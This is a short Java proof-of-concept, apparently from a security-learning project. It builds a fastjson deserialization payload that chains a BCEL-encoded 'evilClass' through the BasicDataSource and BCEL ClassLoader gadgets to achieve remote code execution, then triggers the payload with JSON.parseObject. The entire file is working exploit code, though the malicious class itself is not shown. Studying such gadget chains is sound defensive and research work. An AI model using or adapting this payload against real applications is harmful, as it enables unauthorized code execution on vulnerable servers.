package BCEL;

import classLoader.Class2Bytes;
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import org.apache.bcel.classfile.Utility;

import java.io.File;
import java.util.LinkedHashMap;
import java.util.Map;

public class fastjsonRCE {
    public static void main(String[] args) throws Exception {
        // 构造BCEL特定格式的名称字符串
        byte[] bytes = new Class2Bytes().class2bytes(new File("src/main/java/BCEL/evilClass.class"));
        String ClassName = "$$BCEL$$" +  Utility.encode(bytes, true);
        System.out.println(ClassName);
        // 创建一个Map对象, 用于存储要序列化的数据
        Map<String, Object> exp = new LinkedHashMap<>();
        exp.put("@type", "org.apache.commons.dbcp.BasicDataSource");
        exp.put("driverClassName",ClassName);
        // 创建Map对象，存放BCELclassloader
        Map<String, Object> bcel = new LinkedHashMap<>();
        bcel.put("@type", "org.apache.bcel.util.ClassLoader");

        exp.put("driverClassLoader", bcel);
        String strExp = JSON.toJSONString(exp);
        System.out.println(strExp);
        JSONObject jsonObject = JSON.parseObject(strExp);
        System.out.println(jsonObject);


    }
}
